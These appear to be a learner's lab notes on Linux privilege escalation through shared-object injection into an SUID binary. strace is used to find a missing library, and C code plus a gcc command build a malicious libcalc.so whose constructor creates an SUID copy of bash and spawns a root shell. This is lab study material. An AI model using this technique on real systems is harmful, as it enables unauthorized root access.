# Detection
---
![[Pasted image 20250429155835.png]]
- While running it:
	- ![[Pasted image 20250429155914.png]]
- Using `strace`to trace the execution:
	- It is trying to access some files that are not even present:
	- ![[Pasted image 20250429160026.png]]
	- `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`:
		- ![[Pasted image 20250429160116.png]]
	- **==We can inject our malicious code in a file and rename it to the files the code is trying to access.==**

# Exploitation
---
- Create file `libcalc.c`in  `/home/user/.config`:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
- Compile using:
	- `gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
- ![[Pasted image 20250429160908.png]]
- Run `/usr/local/bin/suid-so` again:
	- ![[Pasted image 20250429160954.png]]